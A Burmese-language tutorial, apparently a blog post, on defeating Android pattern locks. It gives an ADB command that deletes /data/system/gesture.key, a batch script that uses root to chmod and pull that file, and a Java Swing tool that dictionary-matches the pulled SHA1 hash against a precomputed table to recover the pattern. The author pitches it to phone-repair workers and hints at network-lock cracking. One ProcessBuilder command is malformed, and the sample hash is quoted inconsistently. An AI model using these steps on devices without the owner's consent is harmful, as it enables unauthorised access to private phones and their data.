Android-Pattern-Attack
======================

About Android Pattern Attack by Waiferkolar (Brighter Myanmar)

ADB & Java Pattern Lock Attacking 
	Android phone အသံုးျပဳသူအခ်ိဳ႕က သူတို႔ဖုန္းေတြကို လံုျခံဳေရးအတြက္ Pattern Lock ခ်ထားတတ္ၾကပါတယ္၊ Pattern Lock ခ်ထားျခင္းက လံုးျခံဳေရး အတြက္သာလွ်င္မကဘဲ ဖုန္းဖြင့္တဲ့အခါ စတိုင္ေလးနဲ႔ဖုန္းကိုပြတ္လိုက္ရတဲ့အရသာကလဲ Personality ဘဲ ပိုျမင့္သလိုလိုခံစားရတဲ့အခ်က္လဲပါတယ္၊ ဖုန္းကို Pattern Lock ခ်ထားရင္ Lock ဖို႔သံုးတဲ့ Key combination ေတြကို gesture.key ဖိုင္တစ္ခုအျဖစ္ဖန္တီးၿပီးေတာ့ 20 byte SHA1 Hash နဲ႔ encrypt လုပ္ၿပီးသိမ္းပါတယ္၊ သေဘာက 14789 ဆိုၿပီး lock လုပ္ထားတဲ့ pattern တစ္ခုကို “C8C0B24A15DC8BBFD411427973574695200458F0” ဆိုတဲ့တန္ဖိုးနဲ႔သိမ္းထားမွာ၊ SHA1 နဲ႔ encrypt လုပ္ၿပီဆိုရင္ hexadecimal တန္ဖိုး အလံုး 40 ပါမွာျဖစ္ၿပီး MD5 ကေတာ့ Hexadecimal 32 လံုးပါပါတယ္၊
	Android ဖုန္း၀န္ေဆာင္မႈလုပ္ငန္းလုပ္သူတိုင္းအတြက္ Pattern Lock ေျဖတယ္ဆိုတဲ့အခ်က္က ကေလးကြက္ေလးလို႔ ေျပာခ်င္စရာေကာင္းေလာက္ေအာင္ လြယ္လွပါတယ္၊ Pattern Lock ကို ေအာက္ကဥပမာကလို ADB command ေလးအလြယ္သံုးၿပီးျဖတ္ႏိုင္တယ္၊ႏိုင္တယ္၊
adb shell  su -c "rm /data/system/gesture.key"

အထက္က Command ကေတာ့ data partition ထဲရွိ system ဖိုဒါမွ gesture.key ဖိုင္ကို ဖယ္ျပစ္လိုက္တာပါ၊(ျဖတ္ျပစ္လိုက္တာပါ၊ Recovery လုပ္ဖို႔ေတာ့ မစဥ္းစားသင့္ဘူး Android မွာ bin [အမႈိက္ပံုးမပါဘူး ])
Adb command ကိုကၽြမ္းက်င္သူေတြအေနနဲ႔ ဘယ္နည္းနဲ႔႔ပဲျဖည္ျဖည့္ Pattern Lock ကို ျဖည္ဖို႔က အလြယ္ေလးျဖစ္ပါမယ္၊ ဒီ ပိုစ္မွာ လည္း Pattern Lock အေၾကာင္းကို ေရးသြားမွာပါ၊ ေရးသြားမွာက ျဖတ္နည္းအစား Pattern Lock Keys ေတြကိုရွာတဲ့ Program ကိုေရးမွာ၊ မျဖတ္ပစ္ပဲ Key ကိုရွာမယ္ဆိုတဲ့သေဘာပါ၊ (အြန္လိုင္းေပၚမွာ ျပည္တြင္းျပည္ပက မိတ္ေဆြအေတာ္မ်ားမ်ားလဲ ဒီလိုလုပ္ၾကတယ္)၊ 
ဒီပိုစ္ရဲ့ Pattern Lock ရွာတဲ့ Program ကို တည္ေဆာက္တဲ့အခါ ADB နဲ႔ Java တြဲၿပီးတည္ေဆာက္သြားမယ္၊ (လာျပန္ၿပီ Java လို႔ေတာ့ မလုပ္ပါနဲ႔၊ ကၽြန္ေတာ္တို႔လဲ တကယ္ အလုပ္မအားလွဘူး၊ ဒီေတာ့ C++ တို႔ Python တို႔နဲ႔ေနာက္မွဘဲေရးတာေပါ့၊ လက္ယာဥ္ေနတဲ့ Java နဲ႔ ဘဲကစ္လိုက္ဥံဳးမယ္)၊
တည္ေဆာက္သြားမယ့္ Program ရဲ့ အဆင့္ဆင့္ေတြးေခၚပံု၊
၁. အရင္ဆံုး ADB သီးသန္႔သံုးၿပီး gesture.key ဖိုင္ကို data/system/ ထဲကေန ထုတ္ယူၿပီး adb ရွိတဲ့ ဖိုဒါထဲမွာ ထည့္ထားမယ္၊ 
၂. ရလာတဲ့ gesture.key ဖိုင္ကိုဖတ္ဖို႔ Java နဲ႔ UI Frame တစ္ခုတည္ေဆာက္မယ္၊
၃. Java Program ကေန JButton ေလးကိုခလစ္ႏွိပ္တာနဲ႔ အဆင့္ ၁ မွာ ရယူထားတဲ့ gesture.key ဖိုင္ထဲက SHA1 encrypt Hexa တန္ဖိုးေတြကိုဖတ္မယ္၊
၄. ရလာတဲ့ Hexa တန္ဖိုးေတြကို GestureKeyDictionary နဲ႔ တိုက္စစ္မယ္၊
၅. အေျဖကို JLabel ထဲမွာေဖာ္ျပေပးမယ္၊
လိုက္လုပ္ဖို႔ အတြက္လိုအပ္ခ်က္မ်ား
အရင္ဆံုး GestureKeyDictionary ေဒါင္းလုပ္လုပ္ထားပါ၊
ကြန္ျပဴတာရဲ့ E drive ထဲမွာ adb ဆိုတဲ့နာမည္နဲ႔ Folder တစ္ခုတည္ေဆာက္ၿပီး adb.exe, AdbWinApi.dll, AdbWinUsbApi.dll ဖိုင္ေတြကိုထည့္ထားပါ၊ (E drive မသံုးပဲ အျခား Drives ေတြထဲက စိတ္ႀကိဳက္တစ္ခုကိုလည္းသံုးႏိုင္တယ္၊ ဒါေပမယ့္ ဒီပိုစ္မွာေတာ့ E drive ကိုသံုးသြားမယ္၊)၊ ေနာက္ထပ္ လိုအပ္ခ်က္တစ္ခုကေတာ့ AndroidGestureSHA1.rar  ျဖစ္ၿပီးေတာ့ ေအာက္ကလင့္မွာသြားေဒါင္းႏိုင္တယ္၊ ေဒါင္းၿပီးရင္ rar ဖိုင္ကိုျဖည္ၿပီး ရလာတဲ့ AndroidGestureSHA1.txt ဖိုင္ကို SHA1.txt လို႔နာမည္ေျပာင္း၊ ၿပီးရင္ အထက္က တည္ေဆာက္ခဲ့တဲ့ E drive ထဲက adb ဖိုဒါထည္း ထည့္ထား၊ 
www.android-forensics.com/tools/AndroidGestureSHA1.rar
အထက္က အခ်က္ေတြအားလံုးစီစဥ္ၿပီးရင္ စမယ္၊
1.	gesture.key ဖိုင္အားရယူျခင္း 
အရင္ဆံုး Java Program မွာ မေရးခင္ စမ္းသပ္တဲ့အေနနဲ႔ batch ဖိုင္တစ္ခုအေနနဲ႔ေရးမွာ၊ မေရးခင္စဥ္းစားရမွာက လံုခ်ံဳေရးအဆင့္ျမင့္တဲ့ ဖုန္းေတြမွာ Read, Write access မေပးထားဘူး၊ ဒါ့ေၾကာင့္ ဖိုင္ကိုရယူတဲ့အခါ ယူလို႔မရတဲ့ျပႆနာမ်ိဳးတတ္တတ္တယ္၊ ဒီလိုျပႆနာ မတတ္ေအာင္လို႔ အရင္ဆံုး gesture.key ဖိုင္ကို permission ေျပာင္းထားသင့္တယ္၊ (မေျပာင္းခ်င္လဲရတယ္)၊ ၿပီးမွ ဖိုင္ကို ဆြဲယူမယ္၊ Java Program မွာ တိုက္ရိုက္စေရးရင္ ရၿပီျဖစ္ေပမယ့္ တစ္ဆင့္စီ မွန္ေအာင္ အလုပ္လုပ္သြားႏိုင္ဖို႔ အတြက္ အရင္ဆံုး batch ဖိုင္နဲ႔ေရးမယ္ ေအာက္ကအတိုင္း

@echo Off
Title Brighter Myanmar
@echo off
adb shell su -c "chmod 666 /data/system/gesture.key"
adb pull /data/system/gesture.key
adb shell su -c "chmod 666 /data/system/gesture.key"
adb pull /data/system/gesture.key

အထက္က Command ရဲ့ပထမ အေၾကာင္းကေတာ့ adb “su” ကိုသံုးၿပီး data partition ရဲ့ system ဖိုင္ထည္းက gesture.key ဖိုင္ကို Group , User နဲ႔ Other တို႔ အတြက္  Read & Write permission ေျပာင္းလိုက္တာပါ၊ (တစ္ခ်ိဳ႕ေတာ့မလိုအပ္ဘူး ေျပာင္းဖူးသားမို႔လားမသိပါ)၊ ဒုတိယ Command ကေတာ့ ေတာ့ adb pull command ကိုသံုးၿပီး data/system/gesture.key ဖိုင္ကိုဆြဲထုတ္တာ၊ batch အေနနဲ႔ ေရးတဲ့အခါ Destination ထည့္စရာမေပမယ့္ Java နဲ႔ေရးရင္ေတာ့ ထည့္ရမယ္၊ အထက္က လိုေရးၿပီးစမ္းၾကည့္ gesture.key ဖိုင္ကိုရရင္ အခုသံုးတဲ့ adb command ေတြမွန္တယ္၊ ဒီေတာ့ ပထမအဆင့္ ေအာင္ဘီ၊

2.	ဒီအဆင့္မွာေတာ့ Java Program အတြက္ User Interface ေလးတစ္ခုတည္ေဆာက္သြားမယ္၊ ေအာက္က ပံုအတိုင္း


 

ရုပ္ထြက္ကေတာ့ ရွယ္မလွဘူး၊ Frame တစ္ခုလံုးကို Custom တည္ေဆာက္တာတို႔ JButton တို႔ JLabel တို႔ကို စိတ္ႀကိဳက္ ဒီဇိုင္း ဖန္တီးတာတို႔ အခု ပိုစ့္ရဲ့ ရည္ရြယ္ခ်က္မဟုတ္ေတာ့ ရိုးရိုးရွင္းရွင္းေလးပဲဆက္မယ္၊ အထက္ကပံုကိုၾကည့္ရင္ အေျခခံ Java ေလးလာဖူးသူေတြအေနနဲ႔ Jframe, JPanel, JButton နဲ႔ JLabel components ေလးခုပါတယ္ဆိုတာသိႏိုင္ပါတယ္၊ တည္ေဆာက္တာကို အျမန္ပဲေျပာသြားမယ္၊

package com.biber.waifer;

public class Biberkolar {
	public static void main(String[] args) {
		new BrighterGeneration();
	}
}

အရင္ဆံုး Biberkolar Class ကိုတည္ေဆာက္လိုက္တယ္၊ ၿပီးေတာ့ main method တည္ေဆာက္တယ္၊ main method ထဲမွာ BrighterGeneration Class ကို Instantiate စလုပ္ထားတယ္၊ ဒီသေဘာက Program Run တာနဲ႔ စအလုပ္လုပ္မယ့္ main method က BrighterGeneration Class ကိုလွမ္းႏိုးမယ္ ဆိုတဲ့ သေဘာ၊ အခု BrighterGeneration Class ကိုသြားတည္ေဆာက္မယ္၊

public class BrighterGeneration extends JFrame {
	private JPanel BrighterPanel;
	private JButton BrighterButton;
	private JTextField BrighterResult;
	public BrighterGeneration() {
	
	}
}

အထက္က Code ကိုၾကည့္ရင္ BrighterGeneration Class မွာ JFrame ကို extends လုပ္ထားတာေတြ႔ရမယ္၊ private access modifier သံုးၿပီး JPanel,JButton,JtextField components သံုးခုအတြက္ BrighterPanel, BrighterButton နဲ႔ BrighterResult တို႔ကိုတည္ေဆာက္တယ္၊ ေအာက္မွာ Constructor တည္ေဆာက္တယ္၊ ဒီေနရာမွာ ေရွ႕က တည္ေဆာက္ခဲ့တဲ့ Biberkolar Class ထဲရွိ main metod မွာ BrighterGeneration Class ကို Institiate လုပ္တာနဲ႔ BrighterGeneration Class ရဲ့ Constuctor က အေခၚမခံရပဲ အလိုေလွ်ာက္အလုပ္လုပ္မယ္ဆိုတာကို သေဘာေပါက္ပါ၊ (ဒါက Constructors ေတြရဲ့ သဘာ၀)၊ ၿပီးရင္ေအာက္ကအ တိုင္း ဆက္ေရးမယ္၊

                       BrighterPanel = new JPanel();
		BrighterButton = new JButton("ဒီကိုႏွီပ္ရင္");
		BrighterButton.setPreferredSize(new Dimension(150,150));		
		BrighterButton.setFont(new Font("Zawgyi-One",3,12));
		BrighterResult = new JTextField("ဒီမွာအေျဖရမယ္");
		BrighterResult.setBorder(BorderFactory.createLineBorder(Color.black));
		BrighterResult.setPreferredSize(new Dimension(150,150));
		BrighterResult.setFont(new Font("Zawgyi-One",3,12));
		BrighterPanel.setBackground(Color.GRAY);

အထက္က Code Snippet မွာေတာ့ BrighterPanel ကို refrencing လုပ္တယ္၊ ဒီလိုပဲ BrighterButton နဲ႔ BrighterResult တို႔ကိုလဲ refrencing လုပ္တယ္၊ ဗမာစာသံုးထားတဲ့အတြက္ font မွန္မွန္ေပၚေအာင္ setFont method ကို BrighterButton နဲ႔ BrighterResult Object ႏွစ္ခုေပၚမွာေခၚသံုးၿပီးေတာ့ Zawgyi-One ေဖာင့္ကိုေျပာင္းထားတယ္၊ ဒုတိယ Parameter က  စာလံုးထူးေစာင္း (bold & Italic) အတြက္၊ 0 ဆိုရင္ ပံုမွန္စာလံုး (normal)၊ 1 ဆိုရင္စာလံုးအထူ (bold)၊ 2 ဆိုရင္ စာလံုးတစ္ေစာင္း (italic)၊ 3 ဆိုရင္ေတာ့ bold and Italic ၊ စာသားတန္ဖိုးေတြသတ္မွတ္တာေတာ့ မထူးဆန္းလို႔မေျပာေတာ့ဘူး၊ JLabel ကို Border ထားလိုက္တယ္၊ JButton ေကာ JLabel ေကာအတြက္ Dimension ကို 150px အက်ယ္နဲ႔ အျမင့္ထားတယ္၊ JPanel ကိုေတာ့ ေနာက္ခံ မီးခိုးေရာင္လားမသိဘူး (Gray) ေပးလိုက္တယ္၊ အခု JPanel ထဲကို JButton နဲ႔ JLabel ထည့္မယ္၊ JFrame ထည္းကို JPanel ထည့္မယ္၊ ေအာက္ကတိုင္း


                       BrighterPanel.add(BrighterButton);
		BrighterPanel.add(BrighterResult);	   
		add(BrighterPanel);
		setVisible(true);
		setSize(500, 200);
		setResizable(false);
		ImageIcon i = new ImageIcon(getClass().getResource("logo.gif"));
		this.setIconImage(i.getImage());
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setLocationRelativeTo(null);

JFrame ကို setVisible(true) ထားတာ ျမင္ရေအာင္၊ သူမပါရင္ ခုတည္ေဆာက္ထားတဲ့ components ေတြေအာင္ေတာ့ေအာင္တယ္ မျမင္ရဘူး၊ အရြယ္အစားလဲခ်ိတ္ထားတယ္၊ Resize လုပ္လို႔မရေအာင္ပိတ္ထားတယ္၊ JFrame မွာေပၚမယ့္ Logo ကို BrighterMyanmar Logo ျဖစ္ေအာင္ ေျပာင္းထားတယ္၊ Windwo အလည္မွေပၚေအာင္ LocationRelative ကို null ေပးထားတယ္၊ ဒုတိယ အဆင့္ၿပီးဘီ၊

3.	JButton ကိုႏွိပ္တဲ့အခ်ိန္မွာ gesture.key ဖိုင္ကို ဖုန္းထည္းကေန လွမ္းယူမယ္၊ (အေပၚဆံုးမွာ batch နဲ႔ယူတာက စမ္းတာ အားလံုးကို Java Program ကဘဲသံုးမွာ)၊ JButton ကိုႏွိပ္ရင္ လုပ္ငန္းစဥ္ေတြအားလံုးဆက္တိုက္ ျဖစ္သြားမွာျဖစ္လို႔ အရင္ဆံုး JButton ကိုႏွိပ္လားမႏွိပ္လား သိရေအာင္ JButton ေပၚမွာ ျဖစ္ေပၚတဲ့ Action ေတြကိုနားေထာင္မယ္၊ တကယ္ Action ေပၚလာရင္အလုပ္စလုပ္မယ္၊ ေအာက္က အတိုင္း
	BrighterButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				WaiferStartWorking();
			}
		});	

JButton ေပၚမွာ addActionListener သံုးၿပီးနာေထာင္တယ္၊ တကယ္ Action ေပၚလာရရင္ Inner Class ျဖစ္တဲ့ ActionListener ကိုသတင္းေပးမယ္၊ ဒါဆို ActionListener က သူ႔ရဲ့ implement method ျဖစ္တဲ့ actionPerformed method ကို parameter တစ္ခုေပးၿပီး အလုပ္စဆင္းခိုင္းမယ္၊ အထက္က ဥပမာမွာေတာ့ အလုပ္စဆင္းတာနဲ႔ WaiferStartWorking() ဆိုတဲ့ Method ကိုေခၚထားတယ္၊ ဒီေတာ့ JButton ကိုခလစ္ႏွိပ္တာနဲ႔ WaiferStartWorking() method စအလုပ္လုပ္မယ္၊ ဘာေတြလုပ္ခုိင္းမလဲ၊ ရည္ရြယ္ထားတဲ့အတိုင္းပဲ gesture.key ဖိုင္ကို ဖုန္းထည္းကေန ဆြဲထုတ္မယ္၊ ၿပီးရင္ E drive ထဲက adb ဖို္ဒါထည္းကိုထည့္မယ္၊ ေအာက္ကအတိုင္း

public void WaiferStartWorking(){
WaiferAdbChangePermission_GetGestureKey(new ProcessBuilder("E:\\adb\\adb", "pull","su -c 'chmod 666 /data/system/gesture.key'"));
WaiferAdbChangePermission_GetGestureKey(new ProcessBuilder("E:\\adb\\adb", "pull","/data/system/gesture.key","E:\\adb"));
WaiferDictionaryAttackr();
}

အထက္က WaiferStartWorking method အလုပ္စလုပ္တာနဲ႔ WaiferAdbChangePermission_GetGestureKey() method ထဲကို မတူညီတဲ ProcessBuilder Class Object parameter ေတြကိုလွမ္းပစ္တယ္၊ သိပ္မရွင္းျပေတာ့ဘူး အရင္ေန႔က Post မွာရွင္းခဲ့ၿပီးၿပီ၊ အားလံုး အလုပ္လုပ္မယ့္ လုပ္ငန္းစဥ္သံုးခုပါတယ္၊ ပထမတစ္ခုက Permission ေျပာင္းမွာ ဒုတိယ တစ္ခုက ဖုန္းထည္းက ဖိုင္ကို E drive ထဲက adb ဖိုဒါထည္းကိုဆြဲယူမွာ တတိယ တစ္ခုက Dictiornay attack နဲ႔ တိုက္ခိုက္မွာ၊ ဒီေတာ့ကာ WaiferAdbChangePermission_GetGestureKey() method မွာဘာေတြတည္ေဆာက္ထားလဲဆိုတာ ကိုၾကည့္မယ္၊ (အရင္ Adb post ကိုနားလည္ရင္ ခန္႔မွန္းရံုနဲ႔သိႏိုင္တယ္)၊

public void WaiferAdbChangePermission_GetGestureKey(ProcessBuilder BrighterProcess){
		Process pc;
		try {
			pc = BrighterProcess.start();
			pc.waitFor();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}		
	}

အထက္က Code ကေတာ့ မိတ္ေဆြတို႔အတြက္ မဆန္းေတာ့ပါဘူး၊ ေပးတဲ့ ProcessBuilder Object ကိုဖမ္း ၿပီးရင္ Process မွာ အလုပ္စတင္၊ Process မၿပီးမျခင္းေစာင့္ဆိုတဲ့အလုပ္ေတြပါ၊ ဆက္မရွင္းေတာ့ဘူး၊ ယခင္အခန္းကို ဖတ္ဖူးရင္နားလည္မယ္ မဖက္ရေသးရင္ BrighterMyanmar Posts ေတြမွာ ေက်းဇူးျပဳ ၍ ျပန္ရွာဖတ္ေပးပါ၊
အထက္ကအဆင့္အထိၿပီးရင္ေတာ့ E drive ထည္းမွာ gesture.key ဖိုင္ကို ေအာင္ျမင္စြာနဲ႔ ဆြဲထုတ္ၿပီးျဖစ္မယ္၊ ဒီေတာ့ WaiferStartWorking ရဲ့ ေနာက္ဆံုးေခၚထားတဲ့ Method ျဖစ္တဲ့ WaiferDictionaryAttackr() စတင္အလုပ္လုပ္မယ္ ၊

Dictionary Attack နဲ႔ တိုက္မယ္ဆိုတဲ့လုပ္ငန္းစဥ္မွာ လုပ္ေဆာင္ခ်က္ႏွစ္ခုပါမယ္၊ အရင္ဆံုး gesture.key ဖိုင္ထဲက hexa ကုတ္ေတြကိုဖတ္ဖို႔နဲ႔၊ ဒုတိယ အဆင့္က Hexa Code ေတြကို Dictionary နဲ႔တိုက္စစ္ဖို႔ ဒီေတာ့ WaiferDictionaryAttackr() ထဲမွာ String Variable တစ္ခုတည္ေဆာက္ၿပီး WaiferDecoder(); method က return ေပးမယ့္ တန္ဖိုး ကို assign လုပ္မယ္၊ ေအာက္ကအ တိုင္း၊

private void WaiferDictionaryAttackr() {
		String s =  WaiferDecoder();
	    }	

အထက္ကအတိုင္းဆိုရင္ WaiferDecoder() method က တန္ဖိုးတစ္ခုကို မျဖစ္မေန Return ျပန္ေပးရမယ္၊ အဲ့ဒီ့ ျပန္ေပးမယ့္တန္ဖိုးက gesture.key ထဲက hexa Code ေတြကိုဖတ္လို႔ရလာတဲ့တန္ဖိုးျဖစ္ရမယ္၊ ဒီေတာ့ WaiferDecoder() method ကိုတည္ေဆာက္ၿပီး gesture.key ဖိုင္ကိုေအာက္ကအ တိုင္းဖတ္မယ္၊

private String WaiferDecoder() {
		FileInputStream fis = null;
		 ArrayList<String>ar  = new ArrayList<String>();
	    try {
	        fis = new FileInputStream("E:\\adb\\gesture.key"); 
	        while ((i = fis.read()) != -1) {
	            if (i != -1) {		   
	                ar.add(String.format("%02X ", i));	               
	            }
	         }	       
	        fis.close();
	        } catch (FileNotFoundException e) {
	        e.printStackTrace();
	    } catch (IOException e) {
			e.printStackTrace();
		}	   
	    String str = "";
	    for(String s: ar){
	       	 str += s;
	        }
	    System.out.println(str.replaceAll(" ",""));
	   return (str.replaceAll(" ",""));
	}

 အထက္က Method က ေတာ့ တကယ့္ကို သပ္ရပ္လြန္းလွပါတယ္၊ အရင္ဆံုး FileInputStream Object တစ္ခုတည္ေဆာက္တယ္၊ ၿပီးေတာ့ ArrayList တစ္ခုကိုတည္ေဆာက္တယ္၊ FileInputStrem Object ရဲ့ လမ္းေၾကာင္းကို E drive ထဲက adb ဖိုဒါမွာရွိတဲ့ gesture.key ဖိုင္ကိုညြန္းလိုက္တယ္၊ ေနာက္တစ္ဆင့္မွာစဖတ္တယ္၊ ဖတ္တဲ့အခါ fis ရဲ့တန္ဖိုး -1 နဲ႔ တူမျခင္းဖတ္တယ္၊ ဖတ္စရာ Contents ကုန္သြားရင္ -1 ျဖစ္သြားမယ္၊ တကယ္ေတာ့ hexa ဖိုင္မွာ စာလံုးႏွစ္လံုးတိုင္းမွာ space bar တစ္ခ်က္စီျခားထားတယ္၊ ေနာက္ဆံုးစာလံုးျပီးရင္ While က Content တန္ဖိုး မရွိေတာ့တဲ့ -1 ျဖစ္သြားလို႔ဆက္ၿပီး loop မလုပ္ေတာ့ဘူး၊ ေအာက္မွာ hexa ဖိုက္ိုၾကည့္ပါ၊

 

%02X ဆိုတာက Loop တစ္ႀကိမ္လုပ္တိုင္း ရလာမယ့္ မတူညီတဲ့ i (2- digit byte) တန္ဖိုးေတြကို hexa တန္ဖိုးအေနနဲ႔ယူမယ္လို႔သတ္မွတ္တဲ့ format ပါ၊
တစ္ႀကီမ္း Looping လုပ္တိုင္း ရလာတဲ့ Character တန္ဖိုးကို ႏွစ္လံုးရလာမယ္၊ ဥမပာ မထမတစ္ႀကီမ္ C8 ၊ ဒုတိယတစ္ႀကိမ္ C0 စသျဖင့္စသျဖင့္ေပါ့၊ ရလာတဲ့ တန္ဖိုး ႏွစ္လံုး တစ္အုပ္စုစီကို ar arry ထည္းကိုထည့္မယ္၊ ဒါေပမယ့္ အဲ့ဒီ ႏွစ္လံုးတစ္ႀကိမ္ရလာတဲ့တန္ဖိုး ေတြၾကားမွာ space bar ပါေနအံုးမယ္၊ အဲ့ဒီ့ space bar ေတြကိုေျဖာ္ကျပစ္မွရမယ္၊ အခုျဖစ္ေနတဲ့အေျခအက Array တန္ဖိုးျဖစ္တဲ့အတြက္ C8 က Element တစ္ခု C0 က Element တစ္ခုစသျဖင့္ ႏွစ္လံုးတစ္အုပ္စုနဲ႔ တစ္အုပ္စုစီရဲ့ၾကားမွာ ေကာ္မာပါေနမယ္ အဲ့ဒီ့ Comma ေတြကို ျဖတ္ၿပီးအားလံုးေပါင္းဖို႔ အတြက္ Hance for loop ကိုသံုးၿပီး Array ရွိသေလာက္ Elements ေတြအေရအတြက္အတုိင္း တစ္ခုစီအေျဖထုတ္၊ တစ္ခါအေျဖထုတ္တိုင္း Stirng s ထဲကို အေျဖေတြကိုေပါင္းထည့္၊ ဒါဆိုရင္လိုခ်င္တဲ့ Array String ကိုရလာမယ္၊ အဲ့ဒီ့အခါ ၾကားထည္းက White space (spacebar) ေတြကို replace method သံုးၿပီး ဖယ္ထုတ္ျပစ္မယ္၊ ဒါဆိုရင္ေအာက္ကလို သီးသန္႔ String ရလာမယ္၊
	“C8C0B24A15DC8BBFD411427973574695230458F0”
အထက္က String ကို ရရွိျခင္းက ေအာင္ျမင္ျခင္းရဲ့ လမ္းစပါပဲ၊ အထက္က String ကို H0, H1, H2, H3, H4 (ဒီအေၾကာင္းနဲ႔ Algorithm ကိုေနာက္ပိုစ္ေတြမွာရွင္းမယ္) ဆိုၿပီး အပိုင္း ငါးပိုင္းခြဲလိုက္ ပထမအပိုင္းက လိုခ်င္တဲ့ Code ပဲ၊ တကယ့္နည္း အစစ္ကအဲ့ဒီ့လိုလုပ္ရမွာ၊ ဒါေပမယ့္ Dictionary ထဲမွာက တန္ဖိုး အျပည့္နဲ႔ တိုက္စစ္ဖို႔ေပးထားတဲ့ အတြက္ ခု အပိုင္း ငါးပိုင္းမခြဲပဲ အားလံုးနဲ႔တိုက္စစ္မယ္၊ ဒီ့အတြက္  WaiferDictionaryAttackr() method ကိုျပန္သြားမယ္၊ ေအာက္က အတိုင္းေရးလိုက္ အားလံုးတြဲရွင္းပစ္မယ္၊ 


private void WaiferDictionaryAttackr() {
		String s =  WaiferDecoder();
		  File f = new File("E:\\adb\\SHA1.txt");
	    	StringBuilder st= new StringBuilder();
	    	String line;
	    	try {
				br = new BufferedReader(new FileReader(f));
				while((line = br.readLine())!= null){
						st.append(line);
						String ary[] = line.split(";");
						if(ary[2].contentEquals(s)){
							System.out.println(ary[0]);
							BrighterResult.setText(ary[0]);
							break;
						}							
				}
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			}	catch (IOException e) {
				e.printStackTrace();
			}
	    }	

တိုက္စစ္မယ့္ Dictionary ဖိုင္ကို ၀န္တင္ဖို႔ အတြက္ File Object တစ္ခုတည္ေဆာက္တယ္၊ ၿပီးေတာ့ File ကိုတစ္ေၾကာင္းစီဖတ္သြားဖို႔ အတြက္ Buffered Reader Object ကိုတည္ေဆာက္ၿပီးတစ္ေၾကာင္းစီဖတ္တယ္၊ ဖတ္တဲ့အခါမွာ ေနာက္ဆံုး စာေၾကာင္းေနာက္မွာ ဘာစာၾကာင္းမွ မရွိေတာ့တဲ့အထိ ဖတ္မယ္ဆိုၿပီး Ending Point ကို While Loop မွာသတ္မွတ္ကာဖတ္တယ္၊ တစ္ေၾကာင္းဖတ္ၿပီးတိုင္း ဖတ္လိုက္တဲ့ စာေၾကာင္းကို st ဆိုတ့ String Builder မွာ ထည့္ထားတယ္၊ Dictionary ထဲမွာ ရွိတဲ့ တစ္ေၾကာင္းစီက ေအာက္က အတိုင္း
	1234;00 01 02 03;A02A05B025B928C039CF1AE7E8EE04E7C190C0DB
အထက္က စာေၾကာင္းကိုေသခ်ာၾကည့္ရင္ အပိုင္းသံုးပိုင္းေတြ႔ရမယ္၊ ပထမအပိုင္းက pattern key combination၊ ဒုတိယ အပိုင္းက Algorithim၊ တတိယအပိုင္းက encrypted SHA1 code၊ အခုတိုက္စစ္ခ်င္တာက တတိယ အပိုင္းနဲ႔တိုင္စစ္ခ်င္တာ၊ ဒီေတာ့ Dictionary ထဲက တစ္ေၾကာင္းစီကိုဖတ္မယ္၊ တစ္ေၾကာင္းဖတ္တိုင္း အပိုင္းသံုးပိုင္းခြဲမယ္၊ ေနာက္ဆံုးပိုင္းကိုယူမယ္၊ ဒီ့အတြက္ အထက္က encrypted SHA1 ကိုအပိုင္းသံုးပိုင္းပိုင္းဖို႔လိုၿပီ၊ ဒါကလဲလြယ္ပါတယ္၊ သိသာထင္ရွင္းလွတဲ့ ; ဆင္မွီးေကာ္လံကိုသံုးၿပီးခြဲထုတ္ယ္၊ ၿပီးရင္ String array ထဲထည့္မယ္၊ ဒီတာ့ေနာက္ဆံုးအပိုင္းက ary[2] ျဖစ္မယ့္ အဲ့ဒီ့ Array 2 နဲ႔ ေအပၚက String s နဲ႔တိုက္စစ္မယ္၊ မွန္ရင္ Key Combination ျဖစ္တဲ့ ary[0] ေနရာက key ကို JLabel ထဲမွာ အေျဖအျဖစ္ထုတ္ေပးမယ္၊ 

ဆက္မရွင္းေတာ့ဘူး၊ ေသခ်ာေလ့လာၾကည့္ရင္လြယ္ပါတယ္၊ သေဘာေပါက္ရင္ Network Lock ေျဖတဲ့ေနရာမ်ိဳးမွာပါေကာင္းေကာင္းသံုးႏိုင္တယ္၊ 
ေနာက္ရက္ေတြၾကလို႔ အားခဲ့သည္ရွိေသာ္ pattern lock က်ေနမယ္၊ USB debuggin ကလဲ On မထားဘူး၊ ဆိုတဲ့ အေျခအေနမ်ိဳးမွာ ဘယ္လို  ေျဖရွင္းႏိုင္ မလဲ ဆိုတာ programatic စဥ္းစားၿပီးလုပ္ၾကည့္ၾကမယ္၊ ဒါမွမဟုတ္ Adb Wireless Keyboard ေပါ့၊

ပိုစ္အတြက္ ေထာက္ပံေပးမူ

PDF ဖိုင္အျဖစ္ေဒါင္းရန္ ->  https://drive.google.com/file/d/0B6obEA4oP-old18tWmNYTjF3YVU/edit?usp=sharing
Java Source Code ေဒါင္းရန္ ->
Exe file အျဖစ္ရယူရန္ -> https://drive.google.com/file/d/0B6obEA4oP-olcU5TOF9LMHJHdGc/edit?usp=sharing

အထက္က ပိုစ့္ကို Brighter Myanmar မွေရးတာျဖစ္ၿပီး အကယ္၍ အမွားရွာေတြ႔ပါက ေက်းဇူးျပဳၿပီး brightermyanmar@gmail.com ကိုအေၾကာင္းၾကားေပးပါ၊ အားလံုးကိုေသခ်ာျပင္ေပးလိုက္ပါမယ္၊
 

 

